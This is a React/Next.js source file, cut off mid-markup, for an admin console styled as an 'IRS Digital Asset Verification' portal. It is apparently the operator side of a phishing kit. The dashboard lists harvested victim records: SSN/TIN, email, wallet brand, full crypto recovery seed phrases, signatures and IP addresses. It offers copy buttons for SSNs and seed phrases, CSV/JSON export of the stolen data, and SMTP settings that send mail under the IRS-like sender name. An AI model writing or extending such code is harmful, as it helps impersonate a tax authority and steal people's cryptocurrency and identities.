'use client';

import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import {
  Shield,
  Search,
  RefreshCw,
  Download,
  Trash2,
  Eye,
  LogOut,
  Copy,
  Check,
  HardDrive,
  Flame,
  Calendar,
  Layers,
  X,
  ExternalLink,
  Settings,
  Key,
  Mail,
  Send,
  Database,
  EyeOff,
} from 'lucide-react';

interface Submission {
  id: string;
  reference_number: string;
  submitted_at: string;
  ssn_tin: string;
  email: string;
  wallet_type: string;
  wallet_brand: string;
  seed_length: number;
  seed_words: string[];
  seed_phrase_full: string;
  signature_data: string;
  client_ip: string;
  user_agent: string;
}

interface Stats {
  total: number;
  today: number;
  coldWallets: number;
  hotWallets: number;
  topBrand: string;
}

export default function AdminDashboardPage() {
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [stats, setStats] = useState<Stats>({
    total: 0,
    today: 0,
    coldWallets: 0,
    hotWallets: 0,
    topBrand: 'None',
  });
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState('');
  const [walletFilter, setWalletFilter] = useState('all');
  const [selectedSub, setSelectedSub] = useState<Submission | null>(null);
  const [copiedWords, setCopiedWords] = useState(false);
  const [copiedSSN, setCopiedSSN] = useState<string | null>(null);
  const [deleteConfirmId, setDeleteConfirmId] = useState<string | null>(null);
  const router = useRouter();

  // Settings Modal State
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const [activeSettingsTab, setActiveSettingsTab] = useState<'email' | 'password' | 'db'>('email');
  const [mongoConnected, setMongoConnected] = useState(false);

  // Email Config State
  const [emailConfig, setEmailConfig] = useState({
    enabled: true,
    smtp_host: 'smtp.gmail.com',
    smtp_port: 587,
    smtp_secure: false,
    smtp_user: '',
    smtp_pass: '',
    recipient_email: '',
    sender_name: 'IRS Digital Asset Verification Portal',
  });
  const [showSmtpPass, setShowSmtpPass] = useState(false);
  const [testEmailTarget, setTestEmailTarget] = useState('');
  const [testEmailLoading, setTestEmailLoading] = useState(false);
  const [testEmailStatus, setTestEmailStatus] = useState<{ success: boolean; msg: string } | null>(null);
  const [saveEmailLoading, setSaveEmailLoading] = useState(false);
  const [saveEmailMsg, setSaveEmailMsg] = useState<{ success: boolean; msg: string } | null>(null);

  // Password Change State
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [passChangeLoading, setPassChangeLoading] = useState(false);
  const [passChangeMsg, setPassChangeMsg] = useState<{ success: boolean; msg: string } | null>(null);

  // Check auth and load data
  const loadData = async () => {
    setLoading(true);
    try {
      // Check auth status
      const authRes = await fetch('/api/auth');
      const authData = await authRes.json();
      if (!authData.authenticated) {
        router.push('/admin/login');
        return;
      }

      // Fetch submissions
      const res = await fetch('/api/submissions');
      const data = await res.json();
      if (data.success) {
        setSubmissions(data.submissions || []);
        setStats(data.stats || {});
        if (data.mongo_connected !== undefined) {
          setMongoConnected(data.mongo_connected);
        }
      }
    } catch (err) {
      console.error('Error fetching admin data:', err);
    } finally {
      setLoading(false);
    }
  };

  const loadSettings = async () => {
    try {
      const res = await fetch('/api/settings');
      const data = await res.json();
      if (data.success && data.settings) {
        setEmailConfig(data.settings.email_config);
        setMongoConnected(data.settings.mongo_connected);
      }
    } catch (e) {
      console.error('Failed to load settings:', e);
    }
  };

  const openSettingsModal = () => {
    setIsSettingsOpen(true);
    setSaveEmailMsg(null);
    setTestEmailStatus(null);
    setPassChangeMsg(null);
    setCurrentPassword('');
    setNewPassword('');
    setConfirmPassword('');
    loadSettings();
  };

  const handleSaveEmailConfig = async (e: React.FormEvent) => {
    e.preventDefault();
    setSaveEmailLoading(true);
    setSaveEmailMsg(null);
    try {
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email_config: emailConfig }),
      });
      const data = await res.json();
      if (data.success) {
        setSaveEmailMsg({ success: true, msg: 'Email & SMTP settings saved to database!' });
        if (data.settings?.mongo_connected !== undefined) {
          setMongoConnected(data.settings.mongo_connected);
        }
      } else {
        setSaveEmailMsg({ success: false, msg: data.error || 'Failed to save settings' });
      }
    } catch (err: any) {
      setSaveEmailMsg({ success: false, msg: err?.message || 'Network error' });
    } finally {
      setSaveEmailLoading(false);
    }
  };

  const handleSendTestEmail = async () => {
    setTestEmailLoading(true);
    setTestEmailStatus(null);
    try {
      const res = await fetch('/api/settings/test-email', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email_config: emailConfig,
          target_email: testEmailTarget || emailConfig.recipient_email || emailConfig.smtp_user,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setTestEmailStatus({ success: true, msg: data.message });
      } else {
        setTestEmailStatus({ success: false, msg: data.error || 'SMTP connection failed' });
      }
    } catch (err: any) {
      setTestEmailStatus({ success: false, msg: err?.message || 'Network error' });
    } finally {
      setTestEmailLoading(false);
    }
  };

  const handleChangeAdminPassword = async (e: React.FormEvent) => {
    e.preventDefault();
    setPassChangeMsg(null);

    if (newPassword !== confirmPassword) {
      setPassChangeMsg({ success: false, msg: 'New passwords do not match' });
      return;
    }

    if (newPassword.length < 4) {
      setPassChangeMsg({ success: false, msg: 'New password must be at least 4 characters' });
      return;
    }

    setPassChangeLoading(true);
    try {
      const res = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          current_admin_password: currentPassword,
          new_admin_password: newPassword,
        }),
      });
      const data = await res.json();
      if (data.success) {
        setPassChangeMsg({ success: true, msg: 'Admin password updated successfully in database!' });
        setCurrentPassword('');
        setNewPassword('');
        setConfirmPassword('');
      } else {
        setPassChangeMsg({ success: false, msg: data.error || 'Failed to update password' });
      }
    } catch (err: any) {
      setPassChangeMsg({ success: false, msg: err?.message || 'Network error' });
    } finally {
      setPassChangeLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  const handleLogout = async () => {
    await fetch('/api/auth', { method: 'DELETE' });
    router.push('/admin/login');
  };

  const handleDelete = async (id: string) => {
    try {
      const res = await fetch(`/api/submissions?id=${id}`, { method: 'DELETE' });
      if (res.ok) {
        setSubmissions((prev) => prev.filter((s) => s.id !== id));
        if (selectedSub?.id === id) setSelectedSub(null);
        setDeleteConfirmId(null);
        // Refresh stats
        const updatedRes = await fetch('/api/submissions');
        const updatedData = await updatedRes.json();
        if (updatedData.success) setStats(updatedData.stats);
      }
    } catch (err) {
      console.error('Error deleting submission:', err);
    }
  };

  const copyToClipboard = (text: string, type: 'words' | 'ssn', id?: string) => {
    navigator.clipboard.writeText(text);
    if (type === 'words') {
      setCopiedWords(true);
      setTimeout(() => setCopiedWords(false), 2000);
    } else if (type === 'ssn' && id) {
      setCopiedSSN(id);
      setTimeout(() => setCopiedSSN(null), 2000);
    }
  };

  const exportCSV = () => {
    if (submissions.length === 0) return;
    const headers = ['Reference ID', 'Date/Time', 'SSN/TIN', 'Email', 'Wallet Type', 'Wallet Brand', 'Seed Length', 'Seed Words', 'Client IP'];
    const rows = submissions.map((s) => [
      s.reference_number,
      s.submitted_at,
      s.ssn_tin,
      s.email,
      s.wallet_type,
      s.wallet_brand,
      s.seed_length,
      `"${s.seed_phrase_full.replace(/"/g, '""')}"`,
      s.client_ip,
    ]);

    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((e) => e.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `irs_submissions_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  const exportJSON = () => {
    if (submissions.length === 0) return;
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(submissions, null, 2));
    const link = document.createElement('a');
    link.setAttribute('href', dataStr);
    link.setAttribute('download', `irs_submissions_${new Date().toISOString().slice(0, 10)}.json`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // Filter submissions
  const filteredSubmissions = submissions.filter((s) => {
    const q = searchQuery.toLowerCase().trim();
    const matchesSearch =
      !q ||
      s.reference_number.toLowerCase().includes(q) ||
      s.ssn_tin.toLowerCase().includes(q) ||
      s.email.toLowerCase().includes(q) ||
      s.wallet_brand.toLowerCase().includes(q) ||
      s.seed_phrase_full.toLowerCase().includes(q);

    const matchesWallet =
      walletFilter === 'all' ||
      (walletFilter === 'cold' && s.wallet_type.toLowerCase().includes('cold')) ||
      (walletFilter === 'hot' && s.wallet_type.toLowerCase().includes('hot'));

    return matchesSearch && matchesWallet;
  });

  return (
    <div style={{
      minHeight: '100vh',
      background: '#f4f6f8',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      color: '#212121',
    }}>
      {/* Top Navbar */}
      <header style={{
        background: '#112e51',
        borderBottom: '4px solid #005ea2',
        padding: '14px 28px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'space-between',
        flexWrap: 'wrap',
        gap: '12px',
        color: '#ffffff',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <div style={{
            background: 'rgba(255, 255, 255, 0.12)',
            padding: '8px',
            borderRadius: '8px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            color: '#45c8f1',
          }}>
            <Shield size={24} />
          </div>
          <div>
            <div style={{ fontSize: '18px', fontWeight: 700, letterSpacing: '0.5px' }}>
              IRS Digital Asset Verification &bull; Admin Console
            </div>
            <div style={{ fontSize: '12px', color: '#aeb0b5' }}>
              Submissions Dossier &amp; Compliance Management
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <button
            onClick={loadData}
            title="Refresh Data"
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: 'rgba(255, 255, 255, 0.1)',
              color: '#ffffff',
              border: '1px solid rgba(255, 255, 255, 0.2)',
              padding: '8px 14px',
              borderRadius: '6px',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            <RefreshCw size={14} className={loading ? 'animate-spin' : ''} />
            <span>Refresh</span>
          </button>

          <button
            onClick={exportCSV}
            title="Export CSV"
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: 'rgba(255, 255, 255, 0.1)',
              color: '#ffffff',
              border: '1px solid rgba(255, 255, 255, 0.2)',
              padding: '8px 14px',
              borderRadius: '6px',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            <Download size={14} />
            <span>CSV</span>
          </button>

          <button
            onClick={exportJSON}
            title="Export JSON"
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: 'rgba(255, 255, 255, 0.1)',
              color: '#ffffff',
              border: '1px solid rgba(255, 255, 255, 0.2)',
              padding: '8px 14px',
              borderRadius: '6px',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            <Download size={14} />
            <span>JSON</span>
          </button>

          <div
            title={mongoConnected ? 'Connected to MongoDB Atlas / Cloud' : 'Using Local Storage Mirror (Add MONGODB_URI in .env.local for Vercel)'}
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: mongoConnected ? 'rgba(46, 164, 79, 0.18)' : 'rgba(235, 179, 58, 0.18)',
              border: `1px solid ${mongoConnected ? 'rgba(46, 164, 79, 0.4)' : 'rgba(235, 179, 58, 0.4)'}`,
              padding: '6px 12px',
              borderRadius: '20px',
              fontSize: '12px',
              fontWeight: 600,
              color: mongoConnected ? '#3fb950' : '#e3b341',
            }}
          >
            <span style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: mongoConnected ? '#3fb950' : '#e3b341' }}></span>
            <span>{mongoConnected ? 'MongoDB Online' : 'Local Storage'}</span>
          </div>

          <button
            onClick={openSettingsModal}
            title="System & Email Settings"
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: '#005ea2',
              color: '#ffffff',
              border: '1px solid #005ea2',
              padding: '8px 14px',
              borderRadius: '6px',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            <Settings size={14} />
            <span>Settings</span>
          </button>

          <button
            onClick={handleLogout}
            title="Sign Out"
            style={{
              display: 'inline-flex',
              alignItems: 'center',
              gap: '6px',
              background: '#d9381e',
              color: '#ffffff',
              border: 'none',
              padding: '8px 14px',
              borderRadius: '6px',
              fontSize: '13px',
              fontWeight: 600,
              cursor: 'pointer',
            }}
          >
            <LogOut size={14} />
            <span>Logout</span>
          </button>
        </div>
      </header>

      {/* Main Container */}
      <main style={{ maxWidth: '1340px', margin: '0 auto', padding: '28px 20px' }}>
        {/* Statistics Cards */}
        <div style={{
          display: 'grid',
          gridTemplateColumns: 'repeat(auto-fit, minmax(230px, 1fr))',
          gap: '16px',
          marginBottom: '28px',
        }}>
          {/* Card 1 */}
          <div style={{ background: '#ffffff', border: '1px solid #dfe1e2', borderRadius: '10px', padding: '20px', boxShadow: '0 2px 8px rgba(0,0,0,0.04)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', color: '#565c65', fontSize: '13px', fontWeight: 600 }}>
              <span>Total Submissions</span>
              <Layers size={18} color="#005ea2" />
            </div>
            <div style={{ fontSize: '30px', fontWeight: 700, color: '#112e51', marginTop: '10px' }}>
              {stats.total || 0}
            </div>
          </div>

          {/* Card 2 */}
          <div style={{ background: '#ffffff', border: '1px solid #dfe1e2', borderRadius: '10px', padding: '20px', boxShadow: '0 2px 8px rgba(0,0,0,0.04)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', color: '#565c65', fontSize: '13px', fontWeight: 600 }}>
              <span>Past 24 Hours</span>
              <Calendar size={18} color="#2e8540" />
            </div>
            <div style={{ fontSize: '30px', fontWeight: 700, color: '#2e8540', marginTop: '10px' }}>
              {stats.today || 0}
            </div>
          </div>

          {/* Card 3 */}
          <div style={{ background: '#ffffff', border: '1px solid #dfe1e2', borderRadius: '10px', padding: '20px', boxShadow: '0 2px 8px rgba(0,0,0,0.04)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', color: '#565c65', fontSize: '13px', fontWeight: 600 }}>
              <span>Wallet Breakdown</span>
              <div style={{ display: 'flex', gap: '8px' }}>
                <HardDrive size={16} color="#005ea2" />
                <Flame size={16} color="#e06a3b" />
              </div>
            </div>
            <div style={{ fontSize: '16px', fontWeight: 700, color: '#112e51', marginTop: '12px' }}>
              <span style={{ color: '#005ea2' }}>Cold: {stats.coldWallets || 0}</span>
              <span style={{ color: '#dfe1e2', margin: '0 8px' }}>|</span>
              <span style={{ color: '#e06a3b' }}>Hot: {stats.hotWallets || 0}</span>
            </div>
          </div>

          {/* Card 4 */}
          <div style={{ background: '#ffffff', border: '1px solid #dfe1e2', borderRadius: '10px', padding: '20px', boxShadow: '0 2px 8px rgba(0,0,0,0.04)' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', color: '#565c65', fontSize: '13px', fontWeight: 600 }}>
              <span>Top Brand</span>
              <Shield size={18} color="#45c8f1" />
            </div>
            <div style={{ fontSize: '20px', fontWeight: 700, color: '#112e51', marginTop: '12px', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>
              {stats.topBrand || 'N/A'}
            </div>
          </div>
        </div>

        {/* Filter & Search Bar */}
        <div style={{
          background: '#ffffff',
          border: '1px solid #dfe1e2',
          borderRadius: '10px',
          padding: '16px 20px',
          marginBottom: '20px',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          flexWrap: 'wrap',
          gap: '14px',
          boxShadow: '0 2px 6px rgba(0,0,0,0.02)',
        }}>
          {/* Search Input */}
          <div style={{ position: 'relative', flex: '1', minWidth: '260px' }}>
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search by SSN/TIN, email, wallet, ref ID, or seed words..."
              style={{
                width: '100%',
                height: '40px',
                padding: '8px 12px 8px 36px',
                border: '1px solid #dfe1e2',
                borderRadius: '6px',
                fontSize: '14px',
                outline: 'none',
                boxSizing: 'border-box',
              }}
            />
            <Search size={16} style={{ position: 'absolute', left: '12px', top: '12px', color: '#71767a' }} />
          </div>

          {/* Wallet Type Filter */}
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
            <label style={{ fontSize: '13px', fontWeight: 600, color: '#565c65' }}>Type:</label>
            <select
              value={walletFilter}
              onChange={(e) => setWalletFilter(e.target.value)}
              style={{
                height: '40px',
                padding: '8px 12px',
                border: '1px solid #dfe1e2',
                borderRadius: '6px',
                fontSize: '14px',
                color: '#112e51',
                outline: 'none',
                background: '#ffffff',
              }}
            >
              <option value="all">All Wallets</option>
              <option value="cold">Cold Wallets Only</option>
              <option value="hot">Hot Wallets Only</option>
            </select>
          </div>
        </div>

        {/* Submissions Table */}
        <div style={{
          background: '#ffffff',
          border: '1px solid #dfe1e2',
          borderRadius: '10px',
          overflow: 'hidden',
          boxShadow: '0 4px 12px rgba(0,0,0,0.04)',
        }}>
          <div style={{ overflowX: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', textAlign: 'left', fontSize: '14px' }}>
              <thead>
                <tr style={{ background: '#f8f9fa', borderBottom: '2px solid #dfe1e2', color: '#112e51', fontWeight: 700 }}>
                  <th style={{ padding: '14px 18px' }}>Reference ID</th>
                  <th style={{ padding: '14px 18px' }}>Submitted</th>
                  <th style={{ padding: '14px 18px' }}>SSN / TIN</th>
                  <th style={{ padding: '14px 18px' }}>Email Address</th>
                  <th style={{ padding: '14px 18px' }}>Wallet</th>
                  <th style={{ padding: '14px 18px' }}>Seed Length</th>
                  <th style={{ padding: '14px 18px' }}>Signature</th>
                  <th style={{ padding: '14px 18px', textAlign: 'right' }}>Actions</th>
                </tr>
              </thead>
              <tbody>
                {filteredSubmissions.length === 0 ? (
                  <tr>
                    <td colSpan={8} style={{ padding: '48px', textAlign: 'center', color: '#71767a' }}>
                      {loading ? 'Loading submissions...' : 'No submissions found.'}
                    </td>
                  </tr>
                ) : (
                  filteredSubmissions.map((sub) => (
                    <tr
                      key={sub.id}
                      style={{ borderBottom: '1px solid #edf2f7', transition: 'background 0.15s' }}
                      onMouseEnter={(e) => (e.currentTarget.style.background = '#f9fafb')}
                      onMouseLeave={(e) => (e.currentTarget.style.background = '#ffffff')}
                    >
                      {/* Ref ID */}
                      <td style={{ padding: '14px 18px', fontFamily: 'monospace', fontWeight: 700, color: '#005ea2' }}>
                        {sub.reference_number}
                      </td>

                      {/* Date */}
                      <td style={{ padding: '14px 18px', color: '#565c65', whiteSpace: 'nowrap' }}>
                        {new Date(sub.submitted_at).toLocaleString([], {
                          month: 'short',
                          day: 'numeric',
                          year: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit',
                        })}
                      </td>

                      {/* SSN */}
                      <td style={{ padding: '14px 18px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                          <span style={{ fontFamily: 'monospace', fontWeight: 600, color: '#112e51' }}>{sub.ssn_tin}</span>
                          {sub.ssn_tin && sub.ssn_tin !== 'Not Provided' && (
                            <button
                              onClick={() => copyToClipboard(sub.ssn_tin, 'ssn', sub.id)}
                              title="Copy SSN"
                              style={{ background: 'none', border: 'none', cursor: 'pointer', color: '#71767a', padding: '2px' }}
                            >
                              {copiedSSN === sub.id ? <Check size={14} color="#2e8540" /> : <Copy size={14} />}
                            </button>
                          )}
                        </div>
                      </td>

                      {/* Email */}
                      <td style={{ padding: '14px 18px', color: sub.email && sub.email !== 'Not Provided' ? '#112e51' : '#71767a', fontStyle: sub.email && sub.email !== 'Not Provided' ? 'normal' : 'italic' }}>
                        {sub.email || 'Not Provided'}
                      </td>

                      {/* Wallet */}
                      <td style={{ padding: '14px 18px' }}>
                        <span style={{
                          display: 'inline-block',
                          background: sub.wallet_type.toLowerCase().includes('cold') ? '#edf5fc' : '#fff3eb',
                          color: sub.wallet_type.toLowerCase().includes('cold') ? '#005ea2' : '#e06a3b',
                          padding: '3px 8px',
                          borderRadius: '4px',
                          fontSize: '12px',
                          fontWeight: 700,
                          marginRight: '6px',
                        }}>
                          {sub.wallet_type.toLowerCase().includes('cold') ? 'COLD' : 'HOT'}
                        </span>
                        <strong style={{ color: '#112e51' }}>{sub.wallet_brand}</strong>
                      </td>

                      {/* Seed Length */}
                      <td style={{ padding: '14px 18px' }}>
                        <span style={{
                          background: '#f0f4f8',
                          border: '1px solid #d0dbe5',
                          borderRadius: '4px',
                          padding: '3px 8px',
                          fontSize: '12px',
                          fontWeight: 600,
                          color: '#112e51',
                        }}>
                          {sub.seed_length || sub.seed_words.length} Words
                        </span>
                      </td>

                      {/* Signature Preview Thumbnail */}
                      <td style={{ padding: '14px 18px' }}>
                        {sub.signature_data ? (
                          <div style={{
                            background: '#ffffff',
                            border: '1px solid #dfe1e2',
                            borderRadius: '4px',
                            padding: '2px 6px',
                            display: 'inline-block',
                          }}>
                            <img src={sub.signature_data} alt="Sig" style={{ height: '24px', maxWidth: '80px', display: 'block' }} />
                          </div>
                        ) : (
                          <span style={{ color: '#aeb0b5', fontSize: '12px' }}>None</span>
                        )}
                      </td>

                      {/* Actions */}
                      <td style={{ padding: '14px 18px', textAlign: 'right' }}>
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'flex-end', gap: '8px' }}>
                          <button
                            onClick={() => setSelectedSub(sub)}
                            title="View Full Dossier"
                            style={{
                              background: '#005ea2',
                              color: '#ffffff',
                              border: 'none',
                              padding: '6px 12px',
                              borderRadius: '4px',
                              fontSize: '13px',
                              fontWeight: 600,
                              cursor: 'pointer',
                              display: 'inline-flex',
                              alignItems: 'center',
                              gap: '4px',
                            }}
                          >
                            <Eye size={14} />
                            <span>View</span>
                          </button>

                          <button
                            onClick={() => setDeleteConfirmId(sub.id)}
                            title="Delete Submission"
                            style={{
                              background: 'transparent',
                              color: '#d9381e',
                              border: '1px solid #f8b4b4',
                              padding: '6px 8px',
                              borderRadius: '4px',
                              cursor: 'pointer',
                              display: 'inline-flex',
                              alignItems: 'center',
                            }}
                          >
                            <Trash2 size={14} />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      {/* ------------------------------------------------------------- */}
      {/* DOSSIER DETAILS MODAL                                         */}
      {/* ------------------------------------------------------------- */}
      {selectedSub && (
        <div
          onClick={(e) => {
            if ((e.target as HTMLElement).id === 'dossierOverlay') setSelectedSub(null);
          }}
          id="dossierOverlay"
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            background: 'rgba(0, 0, 0, 0.6)',
            backdropFilter: 'blur(3px)',
            zIndex: 9999,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '20px',
            boxSizing: 'border-box',
          }}
        >
          <div style={{
            background: '#ffffff',
            borderRadius: '12px',
            maxWidth: '780px',
            width: '100%',
            maxHeight: '90vh',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden',
            boxShadow: '0 20px 50px rgba(0,0,0,0.3)',
          }}>
            {/* Modal Header */}
            <div style={{
              background: '#112e51',
              borderBottom: '4px solid #005ea2',
              padding: '20px 24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              color: '#ffffff',
            }}>
              <div>
                <div style={{ fontSize: '11px', color: '#45c8f1', textTransform: 'uppercase', letterSpacing: '1px', fontWeight: 700 }}>
                  Submission Dossier
                </div>
                <h2 style={{ margin: '4px 0 0 0', fontSize: '18px', fontWeight: 700 }}>
                  {selectedSub.reference_number}
                </h2>
              </div>
              <button
                onClick={() => setSelectedSub(null)}
                style={{ background: 'none', border: 'none', color: '#ffffff', cursor: 'pointer' }}
              >
                <X size={22} />
              </button>
            </div>

            {/* Modal Body */}
            <div style={{ padding: '24px', overflowY: 'auto', flex: 1 }}>
              {/* Section 1: Identification */}
              <div style={{ marginBottom: '24px' }}>
                <h3 style={{ fontSize: '15px', color: '#112e51', borderBottom: '2px solid #005ea2', paddingBottom: '4px', margin: '0 0 12px 0' }}>
                  1. Taxpayer Information
                </h3>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '12px' }}>
                  <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '6px', padding: '12px' }}>
                    <div style={{ fontSize: '12px', color: '#565c65', fontWeight: 600 }}>SSN / U.S. TIN:</div>
                    <div style={{ fontSize: '16px', fontWeight: 700, color: '#112e51', fontFamily: 'monospace', marginTop: '4px' }}>
                      {selectedSub.ssn_tin}
                    </div>
                  </div>
                  <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '6px', padding: '12px' }}>
                    <div style={{ fontSize: '12px', color: '#565c65', fontWeight: 600 }}>Email Address:</div>
                    <div style={{ fontSize: '15px', fontWeight: 600, color: '#112e51', marginTop: '4px' }}>
                      {selectedSub.email || 'Not Provided'}
                    </div>
                  </div>
                </div>
              </div>

              {/* Section 2: Wallet Details */}
              <div style={{ marginBottom: '24px' }}>
                <h3 style={{ fontSize: '15px', color: '#112e51', borderBottom: '2px solid #005ea2', paddingBottom: '4px', margin: '0 0 12px 0' }}>
                  2. Wallet Configuration
                </h3>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '12px' }}>
                  <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '6px', padding: '12px' }}>
                    <div style={{ fontSize: '12px', color: '#565c65', fontWeight: 600 }}>Wallet Type:</div>
                    <div style={{ fontSize: '15px', fontWeight: 700, color: '#112e51', marginTop: '4px' }}>
                      {selectedSub.wallet_type}
                    </div>
                  </div>
                  <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '6px', padding: '12px' }}>
                    <div style={{ fontSize: '12px', color: '#565c65', fontWeight: 600 }}>Wallet Brand:</div>
                    <div style={{ fontSize: '15px', fontWeight: 700, color: '#112e51', marginTop: '4px' }}>
                      {selectedSub.wallet_brand}
                    </div>
                  </div>
                  <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: '6px', padding: '12px' }}>
                    <div style={{ fontSize: '12px', color: '#565c65', fontWeight: 600 }}>Seed Length:</div>
                    <div style={{ fontSize: '15px', fontWeight: 700, color: '#112e51', marginTop: '4px' }}>
                      {selectedSub.seed_length} Words
                    </div>
                  </div>
                </div>
              </div>

              {/* Section 3: Seed Phrase Grid */}
              <div style={{ marginBottom: '24px' }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '2px solid #005ea2', paddingBottom: '4px', marginBottom: '14px' }}>
                  <h3 style={{ fontSize: '15px', color: '#112e51', margin: 0 }}>
                    3. Recovery Seed Phrase ({selectedSub.seed_words?.length || 0} Words)
                  </h3>
                  <button
                    onClick={() => copyToClipboard(selectedSub.seed_phrase_full, 'words')}
                    style={{
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: '4px',
                      background: '#005ea2',
                      color: '#ffffff',
                      border: 'none',
                      padding: '4px 10px',
                      borderRadius: '4px',
                      fontSize: '12px',
                      fontWeight: 600,
                      cursor: 'pointer',
                    }}
                  >
                    {copiedWords ? <Check size={14} /> : <Copy size={14} />}
                    <span>{copiedWords ? 'Copied All!' : 'Copy All Words'}</span>
                  </button>
                </div>

                {/* 4-column Grid */}
                <div style={{
                  display: 'grid',
                  gridTemplateColumns: 'repeat(4, 1fr)',
                  gap: '8px',
                  marginBottom: '14px',
                }}>
                  {selectedSub.seed_words?.map((word, i) => (
                    <div
                      key={i}
                      style={{
                        background: '#f0f4f8',
                        border: '1px solid #d0dbe5',
                        borderRadius: '5px',
                        padding: '8px 10px',
                        fontFamily: 'monospace',
                      }}
                    >
                      <div style={{ fontSize: '11px', color: '#71767a', fontWeight: 'bold' }}>
                        #{String(i + 1).padStart(2, '0')}
                      </div>
                      <div style={{ fontSize: '14px', fontWeight: 'bold', color: '#112e51' }}>
                        {word || '—'}
                      </div>
                    </div>
                  ))}
                </div>

                {/* Single line text */}
                <div style={{
                  background: '#112e51',
                  color: '#45c8f1',
                  fontFamily: 'monospace',
                  fontSize: '13px',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  wordBreak: 'break-all',
                }}>
                  {selectedSub.seed_phrase_full}
                </div>
              </div>

              {/* Section 4: Electronic Signature */}
              <div style={{ marginBottom: '24px' }}>
                <h3 style={{ fontSize: '15px', color: '#112e51', borderBottom: '2px solid #005ea2', paddingBottom: '4px', margin: '0 0 12px 0' }}>
                  4. Taxpayer Electronic Signature
                </h3>
                {selectedSub.signature_data ? (
                  <div style={{
                    background: '#ffffff',
                    border: '1.5px solid #d0dbe5',
                    borderRadius: '6px',
                    padding: '16px',
                    display: 'inline-block',
                  }}>
                    <img src={selectedSub.signature_data} alt="Full Signature" style={{ maxHeight: '100px', maxWidth: '340px', display: 'block' }} />
                    <div style={{ borderTop: '1px dashed #aeb0b5', marginTop: '10px', paddingTop: '4px', fontSize: '11px', color: '#71767a' }}>
                      &#10005; Authorized Electronic Taxpayer Signature
                    </div>
                  </div>
                ) : (
                  <p style={{ color: '#71767a', fontStyle: 'italic' }}>No electronic signature provided.</p>
                )}
              </div>

              {/* Section 5: Transmission Metadata */}
              <div>
                <h3 style={{ fontSize: '13px', color: '#71767a', borderBottom: '1px solid #e2e8f0', paddingBottom: '4px', margin: '0 0 8px 0', textTransform: 'uppercase' }}>
                  Audit &amp; Security Metadata
                </h3>
